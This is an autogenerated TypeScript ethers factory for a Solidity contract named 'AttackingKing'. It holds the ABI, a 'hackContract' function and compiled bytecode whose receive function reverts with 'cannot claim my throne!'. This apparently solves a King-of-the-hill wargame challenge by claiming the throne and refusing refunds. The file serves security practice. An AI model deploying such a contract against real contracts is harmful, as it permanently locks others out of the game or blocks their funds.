/* Autogenerated file. Do not edit manually. */
/* tslint:disable */
/* eslint-disable */
import {
  Signer,
  utils,
  Contract,
  ContractFactory,
  PayableOverrides,
} from "ethers";
import { Provider, TransactionRequest } from "@ethersproject/providers";
import type { AttackingKing, AttackingKingInterface } from "../AttackingKing";

const _abi = [
  {
    inputs: [
      {
        internalType: "address",
        name: "_contractAddress",
        type: "address",
      },
    ],
    stateMutability: "payable",
    type: "constructor",
  },
  {
    inputs: [],
    name: "contractAddress",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "hackContract",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    stateMutability: "payable",
    type: "receive",
  },
];

const _bytecode =
  "0x608060405260405161022338038061022383398101604081905261002291610047565b600080546001600160a01b0319166001600160a01b0392909216919091179055610077565b60006020828403121561005957600080fd5b81516001600160a01b038116811461007057600080fd5b9392505050565b61019d806100866000396000f3fe60806040526004361061002d5760003560e01c80637ca2474e14610086578063f6b4dfb41461008e57600080fd5b366100815760405162461bcd60e51b815260206004820152601760248201527f63616e6e6f7420636c61696d206d79207468726f6e652100000000000000000060448201526064015b60405180910390fd5b005b600080fd5b61007f6100ca565b34801561009a57600080fd5b506000546100ae906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b600080546040516001600160a01b039091169034908381818185875af1925050503d8060008114610117576040519150601f19603f3d011682016040523d82523d6000602084013e61011c565b606091505b50509050806101645760405162461bcd60e51b8152602060048201526014602482015273115e1d195c9b985b0818d85b1b0819985a5b195960621b6044820152606401610076565b5056fea2646970667358221220a53f849829a6086723ab49767040ca34e070507d26c2d8811e2ca4228501b0a964736f6c63430008090033";

type AttackingKingConstructorParams =
  | [signer?: Signer]
  | ConstructorParameters<typeof ContractFactory>;

const isSuperArgs = (
  xs: AttackingKingConstructorParams
): xs is ConstructorParameters<typeof ContractFactory> => xs.length > 1;

export class AttackingKing__factory extends ContractFactory {
  constructor(...args: AttackingKingConstructorParams) {
    if (isSuperArgs(args)) {
      super(...args);
    } else {
      super(_abi, _bytecode, args[0]);
    }
    this.contractName = "AttackingKing";
  }

  deploy(
    _contractAddress: string,
    overrides?: PayableOverrides & { from?: string | Promise<string> }
  ): Promise<AttackingKing> {
    return super.deploy(
      _contractAddress,
      overrides || {}
    ) as Promise<AttackingKing>;
  }
  getDeployTransaction(
    _contractAddress: string,
    overrides?: PayableOverrides & { from?: string | Promise<string> }
  ): TransactionRequest {
    return super.getDeployTransaction(_contractAddress, overrides || {});
  }
  attach(address: string): AttackingKing {
    return super.attach(address) as AttackingKing;
  }
  connect(signer: Signer): AttackingKing__factory {
    return super.connect(signer) as AttackingKing__factory;
  }
  static readonly contractName: "AttackingKing";
  public readonly contractName: "AttackingKing";
  static readonly bytecode = _bytecode;
  static readonly abi = _abi;
  static createInterface(): AttackingKingInterface {
    return new utils.Interface(_abi) as AttackingKingInterface;
  }
  static connect(
    address: string,
    signerOrProvider: Signer | Provider
  ): AttackingKing {
    return new Contract(address, _abi, signerOrProvider) as AttackingKing;
  }
}
